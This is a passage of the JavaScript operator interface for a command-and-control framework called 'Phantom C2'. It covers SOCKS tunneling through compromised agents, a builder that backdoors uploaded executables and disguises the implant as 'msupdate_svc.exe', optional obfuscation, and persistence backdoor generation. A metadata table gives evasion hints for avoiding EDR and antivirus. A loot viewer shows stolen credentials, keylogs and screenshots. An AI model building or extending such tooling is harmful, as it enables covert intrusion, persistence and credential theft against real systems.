  const port = prompt('SOCKS5 bind port on YOUR machine (default: 1080):', '1080');
  if (!port) return;
  const bind = '127.0.0.1:' + port;
  try {
    const resp = await fetch('/api/tunnel/start', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({agent:agent, bind:bind})
    });
    const data = await resp.json();
    if (data.error) { termLog('error', 'Tunnel error: ' + data.error); return; }
    termLog('success', data.message);
    termLog('info', 'Proxychains config: socks5 127.0.0.1 ' + port);
    termLog('info', 'Usage: proxychains nmap -sT -Pn <target_network>');
  } catch(e) { termLog('error', 'Tunnel failed: ' + e.message); }
}

async function stopTunnel() {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { alert('Select an agent first'); return; }
  try {
    await fetch('/api/tunnel/stop?agent=' + encodeURIComponent(agent));
    termLog('info', 'SOCKS tunnel stopped for ' + agent);
  } catch(e) { termLog('error', e.message); }
}

// ──── Binary Backdoor ────
async function loadBinaryList() {
  const sel = document.getElementById('bd-binary-select');
  if (!sel) return;
  try {
    const bins = await fetchJ('/api/payload/binaries');
    const cur = sel.value;
    let opts = '<option value="">-- Select uploaded binary --</option>';
    if (bins && bins.length > 0) {
      bins.forEach(b => {
        const icon = b.ext === '.exe' ? '🪟' : b.ext === '.elf' ? '🐧' : '📦';
        opts += '<option value="'+b.path+'">'+icon+' '+b.name+' ('+b.size+')</option>';
      });
    } else {
      opts += '<option value="" disabled style="color:var(--text-muted)">No binaries uploaded yet — use ⬆ Upload</option>';
    }
    sel.innerHTML = opts;
    if (cur) sel.value = cur;
  } catch(e) {}
}

function onBinarySelect() {
  const sel = document.getElementById('bd-binary-select');
  const inp = document.getElementById('bd-input');
  if (sel.value) { inp.value = sel.value; inp.style.opacity = '.5'; }
  else { inp.value = ''; inp.style.opacity = '1'; }
}

async function uploadBinary() {
  const fileInput = document.getElementById('bd-upload-file');
  if (!fileInput.files.length) return;
  const file = fileInput.files[0];
  const status = document.getElementById('bd-result');
  status.innerHTML = '<span style="color:var(--yellow)">⬆ Uploading '+file.name+'...</span>';
  const form = new FormData();
  form.append('file', file);
  try {
    const resp = await fetch('/api/payload/binaries/upload', {method:'POST', body:form});
    const data = await resp.json();
    if (data.error) {
      status.innerHTML = '<span style="color:var(--red)">Upload failed: '+data.error+'</span>';
    } else {
      status.innerHTML = '<span style="color:var(--green)">✓ Uploaded: '+data.name+' ('+data.size+')</span>';
      await loadBinaryList();
      // Auto-select the just-uploaded binary
      const sel = document.getElementById('bd-binary-select');
      sel.value = data.path;
      onBinarySelect();
    }
  } catch(e) { status.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
  fileInput.value = '';
}

async function backdoorBinary() {
  const selVal = (document.getElementById('bd-binary-select')||{}).value || '';
  const input = selVal || document.getElementById('bd-input').value.trim();
  const url = document.getElementById('bd-url').value.trim();
  const output = (document.getElementById('bd-output')||{value:''}).value.trim();
  const obfuscate = (document.querySelector('input[name="bd-obfuscate"]:checked')||{}).value === 'garble';
  const result = document.getElementById('bd-result');

  if (!input || !url) { alert('Select a binary (or enter a path) and choose a listener'); return; }

  const btn = document.getElementById('bd-btn');
  const spinLabel = obfuscate ? '⚙️ Garbling agent + bundling… (may take 2–3 min)' : '⚙️ Bundling binary…';
  result.innerHTML = '<div style="background:rgba(139,92,246,0.08);border:1px solid rgba(139,92,246,0.2);border-radius:var(--radius);padding:12px;text-align:center;color:#a78bfa;font-size:13px;font-weight:600;">'+spinLabel+'</div>';
  if (btn) { btn.disabled = true; btn.style.opacity = '.6'; }

  try {
    const resp = await fetch('/api/payload/backdoor/binary', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({input:input, listener_url:url, output:output||'', obfuscate:obfuscate})
    });
    const data = await resp.json();
    if (data.error) {
      result.innerHTML = '<div style="background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.25);border-radius:var(--radius);padding:12px;">'
        + '<div style="color:var(--red);font-weight:700;margin-bottom:4px;">❌ Build Failed</div>'
        + '<div style="font-size:12px;color:var(--text-muted);white-space:pre-wrap;">'+data.error.replace(/</g,'&lt;')+'</div></div>';
    } else {
      const fname = data.filepath ? data.filepath.split('/').pop() : 'output.exe';
      const obfBadge = obfuscate ? '<span style="background:rgba(139,92,246,0.2);color:#a78bfa;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:700;letter-spacing:1px;margin-left:6px;">GARBLED</span>' : '';
      const dlUrl = '/api/payload/download?file=' + encodeURIComponent(data.filepath);
      result.innerHTML =
        '<div style="border:1px solid rgba(16,185,129,0.3);border-radius:var(--radius);overflow:hidden;">'
        + '<div style="background:rgba(16,185,129,0.08);padding:10px 14px;display:flex;align-items:center;gap:8px;">'
        + '<span style="font-size:22px;">💉</span>'
        + '<div><div style="color:var(--green);font-weight:700;font-size:13px;">Backdoor Ready '+obfBadge+'</div>'
        + '<div style="color:var(--text-muted);font-size:11px;margin-top:1px;">Original icon preserved · Agent hidden as msupdate_svc.exe</div></div></div>'
        + '<div style="display:grid;grid-template-columns:1fr 1fr;border-top:1px solid rgba(16,185,129,0.2);">'
        + '<div style="padding:8px 14px;border-right:1px solid rgba(16,185,129,0.2);">'
        + '<div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:2px;">File</div>'
        + '<div style="font-size:11px;color:var(--accent-light);font-family:monospace;word-break:break-all;">'+fname+'</div></div>'
        + '<div style="padding:8px 14px;">'
        + '<div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:2px;">Size</div>'
        + '<div style="font-size:12px;color:var(--blue);font-weight:600;">'+(data.size||'—')+'</div></div></div>'
        + '<div style="padding:10px 14px;border-top:1px solid rgba(16,185,129,0.2);">'
        + '<a href="'+dlUrl+'" style="display:flex;align-items:center;justify-content:center;gap:8px;background:var(--green);color:#000;font-weight:700;font-size:13px;padding:10px;border-radius:var(--radius);text-decoration:none;" onmouseover="this.style.opacity=\'.85\'" onmouseout="this.style.opacity=\'1\'">'
        + '⬇ &nbsp;Download '+fname+'</a></div></div>';
      loadBinaryList();
    }
  } catch(e) {
    result.innerHTML = '<div style="color:var(--red);padding:10px;">⚠️ '+e.message+'</div>';
  }
  if (btn) { btn.disabled = false; btn.style.opacity = '1'; }
}

const BD_META = {
  'dll-sideload':     { os:'WINDOWS', risk:'HIGH',   riskColor:'#ef4444', hint:'Detected by EDR on DLL load — use signed app with weak DLL search order', needsApp:true,  compile:'Build with: mingw-w64 → gcc -shared -o target.dll wrapper.c' },
  'lnk':              { os:'WINDOWS', risk:'LOW',    riskColor:'#22c55e', hint:'LNK files rarely flagged — blend with legit shortcuts in Startup/Desktop', needsApp:true,  compile:'Ready to deploy — no compile needed' },
  'installer':        { os:'WINDOWS', risk:'MEDIUM', riskColor:'#f59e0b', hint:'AV may flag on DownloadFile + Process.Start combo — consider obfuscation',  needsApp:false, compile:'Compile: csc /target:winexe /out:Setup.exe wrapper.cs' },
  'service-dll':      { os:'WINDOWS', risk:'HIGH',   riskColor:'#ef4444', hint:'Service DLLs are heavily monitored — sign the binary or use a LOLBin',     needsApp:false, compile:'Build with: mingw-w64 → gcc -shared -o svc.dll wrapper.c' },
  'registry':         { os:'WINDOWS', risk:'MEDIUM', riskColor:'#f59e0b', hint:'HKCU\\Run rarely needs elevation — combine with masquerading for stealth',  needsApp:false, compile:'Ready to deploy — PowerShell / .reg file' },
  'schtask':          { os:'WINDOWS', risk:'MEDIUM', riskColor:'#f59e0b', hint:'Scheduled tasks logged in Event ID 4698 — use a convincing task name',      needsApp:false, compile:'Ready to deploy — schtasks.exe / PowerShell' },
  'wmi':              { os:'WINDOWS', risk:'HIGH',   riskColor:'#ef4444', hint:'Fileless WMI subscriptions trigger Sysmon Event 19/20/21 — use sparingly', needsApp:false, compile:'Ready to deploy — PowerShell WMI subscription' },
  'office-template':  { os:'WINDOWS', risk:'HIGH',   riskColor:'#ef4444', hint:'Office macros heavily scrutinised — works best on unmanaged endpoints',     needsApp:false, compile:'Ready to deploy — drop into Word STARTUP folder' },
  'startup':          { os:'WINDOWS', risk:'LOW',    riskColor:'#22c55e', hint:'VBScript in Startup folder survives reboots with minimal detection',         needsApp:false, compile:'Ready to deploy — copy .vbs to Startup folder' },
  'bashrc':           { os:'LINUX',   risk:'LOW',    riskColor:'#22c55e', hint:'Bashrc/cron changes blend in — combine all three for maximum persistence',   needsApp:false, compile:'Ready to deploy — bash script' },
};

function bdTypeChanged() {
  const type = document.getElementById('bd-type').value;
  const meta = BD_META[type] || {};
  const badge = document.getElementById('bd-os-badge');
  const opsec = document.getElementById('bd-opsec-bar');
  const appWrap = document.getElementById('bd-target-app-wrap');

  // OS badge
  if (badge) {
    badge.textContent = meta.os || 'WINDOWS';
    badge.style.background = meta.os === 'LINUX' ? 'rgba(34,197,94,0.12)' : 'rgba(99,102,241,0.15)';
    badge.style.color = meta.os === 'LINUX' ? '#16a34a' : 'var(--purple)';
    badge.style.borderColor = meta.os === 'LINUX' ? 'rgba(34,197,94,0.3)' : 'rgba(99,102,241,0.3)';
  }

  // OPSEC bar
  if (opsec) {
    const riskLabel = { 'LOW':'🟢 Low Risk', 'MEDIUM':'🟡 Medium Risk', 'HIGH':'🔴 High Risk' };
    opsec.style.background = meta.risk === 'HIGH' ? 'rgba(239,68,68,0.08)' : meta.risk === 'MEDIUM' ? 'rgba(245,158,11,0.08)' : 'rgba(34,197,94,0.08)';
    opsec.style.borderColor = meta.risk === 'HIGH' ? 'rgba(239,68,68,0.25)' : meta.risk === 'MEDIUM' ? 'rgba(245,158,11,0.25)' : 'rgba(34,197,94,0.25)';
    opsec.style.color = meta.riskColor || '#ca8a04';
    opsec.innerHTML = '<b>' + (riskLabel[meta.risk] || '🟡 Medium Risk') + '</b><span style="opacity:.75;margin-left:6px">' + (meta.hint || '') + '</span>';
  }

  // Target app field
  if (appWrap) appWrap.style.display = meta.needsApp ? 'block' : 'none';
}

function bdListenerSelChanged() {
  const sel = document.getElementById('bd-persist-listener-sel');
  const input = document.getElementById('bd-persist-url');
  if (sel && input && sel.value) input.value = sel.value;
}

async function generatePersistBackdoor() {
  const type = document.getElementById('bd-type').value;
  const url = document.getElementById('bd-persist-url').value.trim();
  const app = document.getElementById('bd-target-app').value.trim();
  const result = document.getElementById('bd-persist-result');
  const btn = document.getElementById('bd-persist-btn');
  const meta = BD_META[type] || {};

  if (!url) {
    result.innerHTML = '<div style="padding:10px;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:6px;color:#ef4444;font-size:12px">⚠ Listener URL required</div>';
    return;
  }

  btn.disabled = true;
  btn.textContent = 'Generating...';
  result.innerHTML = '<div style="color:var(--yellow);font-size:12px;padding:8px 0">⏳ Building backdoor...</div>';

  try {
    const resp = await fetch('/api/payload/backdoor', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({type:type, listener_url:url, target_app:app})
    });
    const data = await resp.json();
    if (data.error) {
      result.innerHTML = '<div style="padding:10px;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:6px;color:#ef4444;font-size:12px">✗ ' + data.error + '</div>';
    } else {
      const fname = data.filepath.split('/').pop();
      result.innerHTML =
        '<div style="background:rgba(34,197,94,0.08);border:1px solid rgba(34,197,94,0.25);border-radius:8px;padding:12px;margin-top:4px">' +
          '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">' +
            '<span style="color:var(--green);font-weight:700;font-size:13px">✓ Backdoor Generated</span>' +
            '<span style="font-size:10px;font-weight:700;padding:2px 7px;border-radius:8px;background:rgba(99,102,241,0.15);color:var(--purple)">' + (meta.os||'WINDOWS') + '</span>' +
          '</div>' +
          '<div style="font-size:11px;color:var(--text-muted);margin-bottom:6px;font-family:monospace;word-break:break-all">' + data.filepath + '</div>' +
          '<div style="font-size:11px;color:var(--cyan);margin-bottom:10px">📋 ' + (meta.compile || 'Ready to deploy') + '</div>' +
          '<a href="/api/payload/download?file='+encodeURIComponent(data.filepath)+'" style="display:inline-flex;align-items:center;gap:6px;padding:8px 16px;background:rgba(99,102,241,0.2);border:1px solid rgba(99,102,241,0.4);border-radius:6px;color:var(--purple);font-size:12px;font-weight:600;text-decoration:none" download="'+fname+'">⬇ Download ' + fname + '</a>' +
        '</div>';
    }
  } catch(e) {
    result.innerHTML = '<div style="padding:10px;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:6px;color:#ef4444;font-size:12px">✗ ' + e.message + '</div>';
  } finally {
    btn.disabled = false;
    btn.innerHTML = '🔓 &nbsp;Generate Backdoor';
  }
}

// Populate backdoor listener selectors
function populateBackdoorListeners() {
  const sel = document.getElementById('bd-listener');
  if (!sel) return;
  const cur = sel.value;
  let opts = '<option value="">-- Select listener --</option>';

  if (window._cachedListeners && window._cachedListeners.length > 0) {
    opts += '<optgroup label="Active Listeners">';
    window._cachedListeners.forEach(l => {
      if (l.status === 'running') {
        const proto = (l.type||'').toUpperCase() === 'HTTPS' ? 'https' : 'http';
        // Replace 0.0.0.0 with the window's location hostname for a usable URL
        const bind = l.bind.replace('0.0.0.0', window.location.hostname);
        const url = proto + '://' + bind;
        opts += '<option value="'+url+'">'+l.name+' ('+url+')</option>';
      }
    });
    opts += '</optgroup>';
  }

  if (window._cachedPresets && window._cachedPresets.length > 0) {
    opts += '<optgroup label="Saved Presets">';
    window._cachedPresets.forEach(p => {
      const proto = (p.type||'http').toLowerCase() === 'https' ? 'https' : 'http';
      const bind = p.bind.replace('0.0.0.0', window.location.hostname);
      const url = proto + '://' + bind;
      opts += '<option value="'+url+'">💾 '+p.name+' ('+url+')</option>';
    });
    opts += '</optgroup>';
  }

  sel.innerHTML = opts;
  if (cur) sel.value = cur;
  // Auto-fill URL field if only one option
  if (!cur && window._cachedListeners) {
    const running = window._cachedListeners.filter(l => l.status === 'running');
    if (running.length === 1) {
      const proto = (running[0].type||'').toUpperCase() === 'HTTPS' ? 'https' : 'http';
      const bind = running[0].bind.replace('0.0.0.0', window.location.hostname);
      const urlEl = document.getElementById('bd-url');
      if (urlEl && !urlEl.value) urlEl.value = proto + '://' + bind;
    }
  }

  // Also populate persistence listener dropdown
  const pSel = document.getElementById('bd-persist-listener-sel');
  if (pSel) {
    let pOpts = '<option value="">-- Select active listener --</option>';
    if (window._cachedListeners && window._cachedListeners.length > 0) {
      window._cachedListeners.forEach(l => {
        if (l.status === 'running') {
          const proto = (l.type||'').toUpperCase() === 'HTTPS' ? 'https' : 'http';
          const bind = l.bind.replace('0.0.0.0', window.location.hostname);
          const url = proto + '://' + bind;
          pOpts += '<option value="'+url+'">'+l.name+' ('+url+')</option>';
        }
      });
    }
    pSel.innerHTML = pOpts;
    // Auto-fill if one listener running
    if (window._cachedListeners) {
      const running = window._cachedListeners.filter(l => l.status === 'running');
      if (running.length === 1) {
        const proto = (running[0].type||'').toUpperCase() === 'HTTPS' ? 'https' : 'http';
        const bind = running[0].bind.replace('0.0.0.0', window.location.hostname);
        const pUrl = document.getElementById('bd-persist-url');
        if (pUrl && !pUrl.value) pUrl.value = proto + '://' + bind;
      }
    }
  }
}

document.getElementById('bd-listener').addEventListener('change', function() {
  if (this.value) document.getElementById('bd-url').value = this.value;
});

// ──── Pivot Graph (Canvas) ────
function drawPivotGraph() {
  const canvas = document.getElementById('pivot-canvas');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  canvas.width = canvas.offsetWidth * 2;
  canvas.height = 500 * 2;
  ctx.scale(2, 2);
  const W = canvas.offsetWidth, H = 500;
  ctx.clearRect(0, 0, W, H);

  if (!window._cachedAgents || window._cachedAgents.length === 0) {
    ctx.fillStyle = getComputedStyle(document.documentElement).getPropertyValue('--text-muted');
    ctx.font = '14px "Segoe UI", sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('No agents connected — deploy agents to see the pivot map', W/2, H/2);
    return;
  }

  const agents = window._cachedAgents;
  const c2x = W/2, c2y = 50;
  const accent = getComputedStyle(document.documentElement).getPropertyValue('--accent-light').trim() || '#a78bfa';
  const green = '#10b981', red = '#ef4444', yellow = '#f59e0b', muted = '#5a6580';
  const textColor = getComputedStyle(document.documentElement).getPropertyValue('--text-primary').trim() || '#e8ecf4';

  // Draw C2 server
  ctx.fillStyle = accent;
  ctx.beginPath(); ctx.arc(c2x, c2y, 22, 0, Math.PI*2); ctx.fill();
  ctx.fillStyle = '#fff'; ctx.font = '16px sans-serif'; ctx.textAlign = 'center'; ctx.fillText('C2', c2x, c2y+5);
  ctx.fillStyle = textColor; ctx.font = '10px sans-serif'; ctx.fillText('Phantom C2', c2x, c2y+38);

  // Group agents by network
  const networks = {};
  agents.forEach(a => {
    const ip = a.ip || '0.0.0.0';
    const net = ip.split('.').slice(0,3).join('.') + '.0/24';
    if (!networks[net]) networks[net] = [];
    networks[net].push(a);
  });

  const netKeys = Object.keys(networks);
  const netSpacing = W / (netKeys.length + 1);

  netKeys.forEach((net, ni) => {
    const nx = netSpacing * (ni + 1);
    const ny = 140;

    // Network label
    ctx.fillStyle = yellow;
    ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
    ctx.fillText(net, nx, ny - 10);

    // Network box
    const boxH = Math.max(120, networks[net].length * 70 + 30);
    ctx.strokeStyle = muted; ctx.lineWidth = 1; ctx.setLineDash([4,4]);
    ctx.strokeRect(nx - 80, ny, 160, boxH);
    ctx.setLineDash([]);

    // Line from C2 to network
    ctx.strokeStyle = accent; ctx.lineWidth = 1.5;
    ctx.beginPath(); ctx.moveTo(c2x, c2y+22); ctx.lineTo(nx, ny); ctx.stroke();

    // Agents in network
    networks[net].forEach((a, ai) => {
      const ax = nx, ay = ny + 35 + ai * 65;
      const color = a.status === 'active' ? green : red;

      // Agent node
      ctx.fillStyle = color;
      ctx.beginPath(); ctx.arc(ax, ay, 16, 0, Math.PI*2); ctx.fill();
      ctx.fillStyle = '#fff'; ctx.font = '12px sans-serif'; ctx.textAlign = 'center';
      ctx.fillText(a.os === 'windows' ? 'W' : 'L', ax, ay+4);

      // Agent label
      ctx.fillStyle = textColor; ctx.font = 'bold 10px sans-serif';
      ctx.fillText(a.name, ax, ay + 30);
      ctx.fillStyle = muted; ctx.font = '9px monospace';
      ctx.fillText(a.ip + ' | ' + a.hostname, ax, ay + 42);
    });
  });
}

// ──── IOC Dashboard ────
function updateIOC() {
  if (!window._cachedAgents) return;
  const agents = window._cachedAgents;

  // Files dropped (agents deployed)
  const files = document.getElementById('ioc-files');
  if (files) {
    files.innerHTML = agents.map(a =>
      '<div style="padding:4px 0;border-bottom:1px solid var(--border)">' +
      '<span style="color:var(--red)">'+a.hostname+'</span>: /tmp/agent <span style="color:var(--text-muted)">(Phantom implant)</span></div>'
    ).join('') || '<div style="color:var(--text-muted)">No files tracked</div>';
  }

  // Network connections (callbacks)
  const network = document.getElementById('ioc-network');
  if (network) {
    network.innerHTML = agents.map(a =>
      '<div style="padding:4px 0;border-bottom:1px solid var(--border)">' +
      '<span style="color:var(--cyan)">'+a.ip+'</span> → YOUR_C2_IP:8080 <span style="color:var(--text-muted)">(HTTP C2 beacon, '+a.sleep+')</span></div>'
    ).join('') || '<div style="color:var(--text-muted)">No connections tracked</div>';
  }

  // Processes
  const procs = document.getElementById('ioc-procs');
  if (procs) {
    procs.innerHTML = agents.map(a =>
      '<div style="padding:4px 0;border-bottom:1px solid var(--border)">' +
      '<span style="color:var(--yellow)">'+a.hostname+'</span>: /tmp/agent <span style="color:var(--text-muted)">(PID unknown, '+(a.os==='windows'?'cmd.exe':'/bin/sh')+' child)</span></div>'
    ).join('') || '<div style="color:var(--text-muted)">No processes tracked</div>';
  }

  // Persistence
  const persist = document.getElementById('ioc-persist');
  if (persist) {
    persist.innerHTML = '<div style="color:var(--text-muted);padding:8px">Persistence artifacts will appear here when agents install persistence mechanisms (cron, registry, etc.)</div>';
  }

  // Update replay agent selector
  const sel = document.getElementById('replay-agent');
  if (sel) {
    const cur = sel.value;
    sel.innerHTML = '<option value="">Select agent...</option>' +
      agents.map(a => '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+a.name+' ('+a.hostname+')</option>').join('');
  }
}

// ──── Session Replay ────
async function loadReplay() {
  const agent = document.getElementById('replay-agent').value;
  const output = document.getElementById('replay-output');
  if (!agent) { output.textContent = 'Select an agent to replay its session history.'; return; }

  try {
    const detail = await fetchJ('/api/agent/' + agent);
    if (!detail.tasks || detail.tasks.length === 0) {
      output.innerHTML = '<span style="color:var(--text-muted)">No commands executed on this agent yet.</span>';
      return;
    }

    output.innerHTML = detail.tasks.map(t => {
      const cmdColor = t.status === 'complete' ? 'var(--green)' : t.status === 'error' ? 'var(--red)' : 'var(--yellow)';
      let html = '<div style="margin-bottom:12px">';
      html += '<span style="color:var(--text-muted);font-size:10px">['+t.time+']</span> ';
      html += '<span style="color:'+cmdColor+';font-weight:600">'+t.type+'</span> ';
      html += '<span style="color:var(--cyan)">'+t.args+'</span>';
      html += ' <span style="font-size:10px;padding:1px 6px;border-radius:3px;background:'+(t.status==='complete'?'var(--green-dim)':t.status==='error'?'var(--red-dim)':'var(--yellow-dim)')+';color:'+(t.status==='complete'?'var(--green)':t.status==='error'?'var(--red)':'var(--yellow)')+'">'+t.status+'</span>';
      if (t.output) {
        html += '\n<span style="color:var(--text-secondary)">'+t.output.substring(0,500)+'</span>';
      }
      if (t.error) {
        html += '\n<span style="color:var(--red)">Error: '+t.error+'</span>';
      }
      html += '</div>';
      return html;
    }).join('<div style="border-top:1px solid var(--border);margin:4px 0"></div>');
  } catch(e) { output.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
}

// ──── Loot Viewer ────
async function loadLoot() {
  const grid = document.getElementById('loot-grid');
  if (!grid) return;
  grid.innerHTML = '<div style="color:var(--text-muted);padding:20px;text-align:center">Loading loot...</div>';
  try {
    const loot = await fetchJ('/api/loot');
    const filter = document.getElementById('loot-filter').value;
    const filtered = filter === 'all' ? loot : loot.filter(l => l.type === filter);
    if (filtered.length === 0) {
      grid.innerHTML = '<div style="color:var(--text-muted);padding:40px;text-align:center;grid-column:1/-1">No loot collected yet. Execute commands to capture output.</div>';
      return;
    }
    const typeIcons = {credentials:'🔑',file:'📄',screenshot:'📸',keylog:'⌨️',sysinfo:'💻',output:'📋'};
    const typeColors = {credentials:'var(--green)',file:'var(--blue)',screenshot:'var(--cyan)',keylog:'var(--yellow)',sysinfo:'var(--accent-light)',output:'var(--text-muted)'};
    grid.innerHTML = filtered.map(l => {
      let content;
      if (l.type === 'screenshot' && l.output.startsWith('data:image/')) {
        content = '<div style="padding:8px 16px"><img src="'+l.output+'" style="width:100%;border-radius:6px;cursor:pointer" onclick="window.open(this.src)" title="Click to open full size"></div>';
      } else {
        content = '<pre style="margin:0;padding:12px 16px;font-size:11px;max-height:200px;overflow-y:auto;background:var(--bg-input);border:none;border-radius:0">'+l.output.substring(0,1000)+'</pre>';
      }
      return '<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden">' +
      '<div style="padding:12px 16px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">' +
      '<div><span style="font-size:16px">'+(typeIcons[l.type]||'📋')+'</span> <strong style="color:'+(typeColors[l.type]||'var(--text-primary)')+'">'+l.type.toUpperCase()+'</strong></div>' +
      '<div style="font-size:11px;color:var(--text-muted)">'+l.agent+' · '+l.time+'</div></div>' +
      '<div style="padding:8px 16px;font-size:11px;color:var(--text-secondary);font-family:monospace">'+l.command+'</div>' +
      content +
      '<div style="padding:6px 16px;font-size:10px;color:var(--text-muted);border-top:1px solid var(--border)">'+l.size+' bytes</div></div>';
    }).join('');
  } catch(e) { grid.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
}

// ──── Command Templates ────
async function loadTemplates() {
  const list = document.getElementById('template-list');
  if (!list) return;
  try {
    const templates = await fetchJ('/api/templates');
    list.innerHTML = templates.map((t,i) =>
      '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:14px;margin-bottom:8px">' +
      '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">' +
      '<div><strong style="color:var(--accent-light)">'+t.name+'</strong> <span style="font-size:10px;color:var(--text-muted);background:var(--bg-hover);padding:2px 6px;border-radius:4px;margin-left:6px">'+t.category+'</span></div>' +
      '<button class="qbtn" onclick="runTemplate('+i+')" style="font-size:11px;padding:4px 12px;background:var(--accent-glow);color:var(--accent-light)">Run All</button></div>' +
      '<div style="font-family:monospace;font-size:11px;color:var(--text-secondary);line-height:1.8">' +
      t.commands.map(c => '<div style="padding:2px 0">$ '+c+'</div>').join('') + '</div></div>'
    ).join('');
  } catch(e) { list.innerHTML = '<div style="color:var(--red)">'+e.message+'</div>'; }
}

async function runTemplate(idx) {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { alert('Select an agent in the Terminal tab first'); return; }
  const templates = await fetchJ('/api/templates');
  const t = templates[idx];
  if (!t) return;
  nav('terminal');
  for (const cmd of t.commands) {
    const parts = cmd.split(' ');
    const command = parts[0];
    const args = parts.slice(1).join(' ');
    await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agent, command:command, args:args})});
    termLog('system', '→ ' + cmd);
    await new Promise(r => setTimeout(r, 500));
  }
  termLog('success', '✓ Template "'+t.name+'" executed ('+t.commands.length+' commands)');
}

// ──── MITRE ATT&CK Mapping ────
const mitreMap = [
  {id:'T1059',name:'Command & Scripting',commands:['shell','ps']},
  {id:'T1082',name:'System Information',commands:['sysinfo']},
  {id:'T1113',name:'Screen Capture',commands:['screenshot']},
  {id:'T1005',name:'Data from Local System',commands:['download']},
  {id:'T1056.001',name:'Keylogging',commands:['keylog']},
  {id:'T1003',name:'OS Credential Dumping',commands:['creds','ad-dump-sam','ad-dump-lsa']},
  {id:'T1558',name:'Kerberoasting',commands:['ad-kerberoast','ad-asreproast']},
  {id:'T1021',name:'Remote Services',commands:['ad-psexec','ad-wmi','ad-winrm','pivot']},
  {id:'T1134',name:'Access Token Manipulation',commands:['token']},
  {id:'T1547',name:'Boot/Logon Autostart',commands:['persist']},
  {id:'T1572',name:'Protocol Tunneling',commands:['socks','portfwd']},
  {id:'T1562',name:'Impair Defenses',commands:['evasion']},
  {id:'T1557',name:'LLMNR/NBT-NS Poisoning',commands:['ad-pass-the-hash']},
  {id:'T1069',name:'Permission Groups Discovery',commands:['ad-enum-groups','ad-enum-admins']},
  {id:'T1018',name:'Remote System Discovery',commands:['ad-enum-computers']},
  {id:'T1033',name:'System Owner/User Discovery',commands:['ad-enum-users']},
];

function renderMitre() {
  const el = document.getElementById('mitre-map');
  if (!el) return;
  el.innerHTML = mitreMap.map(m =>
    '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:8px 10px">' +
    '<div style="font-size:10px;color:var(--cyan);font-weight:600">'+m.id+'</div>' +
    '<div style="font-size:11px;color:var(--text-primary);margin-top:2px">'+m.name+'</div>' +
    '<div style="font-size:10px;color:var(--text-muted);margin-top:3px;font-family:monospace">'+m.commands.join(', ')+'</div></div>'
  ).join('');
}

// ──── Auto-Tasks ────
async function loadAutoTasks() {
  const list = document.getElementById('autotask-list');
  if (!list) return;
  try {
    const tasks = await fetchJ('/api/autotasks');
    if (tasks.length === 0) {
      list.innerHTML = '<div style="color:var(--text-muted);font-size:12px;text-align:center;padding:12px">No auto-tasks configured. New agents will check in without running any commands.</div>';
      return;
    }
    list.innerHTML = tasks.map((t,i) =>
      '<div style="display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:6px;margin-bottom:4px">' +
      '<span style="font-family:monospace;font-size:12px;color:var(--text-primary)">'+t.command+' '+t.args+'</span>' +
      '<button class="qbtn" onclick="removeAutoTask('+i+')" style="color:var(--red);font-size:10px;padding:3px 8px">✕</button></div>'
    ).join('');
  } catch(e) {}
}

async function addAutoTask() {
  const cmd = document.getElementById('at-cmd').value;
  const args = document.getElementById('at-args').value;
  await fetch('/api/autotasks', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'add', command:cmd, args:args})});
  document.getElementById('at-args').value = '';
  loadAutoTasks();
}

async function removeAutoTask(idx) {
  await fetch('/api/autotasks', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({action:'remove', index:idx})});
  loadAutoTasks();
}

// ──── Audit Log ────
async function loadAuditLog() {
  const table = document.getElementById('audit-table');
  if (!table) return;
  try {
    const log = await fetchJ('/api/auditlog');
    if (log.length === 0) {
      table.innerHTML = '<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:24px">No operations logged yet. Send commands to agents to populate the audit trail.</td></tr>';
      return;
    }
    table.innerHTML = log.slice().reverse().map(e =>
      '<tr><td style="font-family:monospace;font-size:12px;color:var(--text-muted)">'+e.time+'</td>' +
      '<td style="color:var(--accent-light);font-weight:600">'+e.operator+'</td>' +
      '<td>'+e.agent+'</td>' +
      '<td><span style="color:var(--cyan);font-size:11px;font-weight:600;text-transform:uppercase">'+e.action+'</span></td>' +
      '<td style="font-family:monospace;font-size:12px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+e.detail+'</td></tr>'
    ).join('');
  } catch(e) {}
}

// ──── Agent Rename ────
async function renameAgent(agentName) {
  const newName = prompt('Rename agent "'+agentName+'" to:');
  if (!newName || !newName.trim()) return;
  await fetch('/api/agent/rename', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agentName, new_name:newName.trim()})});
  refreshAll();
}

async function tagAgent(agentName) {
  // Find current tags from cached agent list
  const cur = (window._cachedAgents||[]).find(a => a.name === agentName);
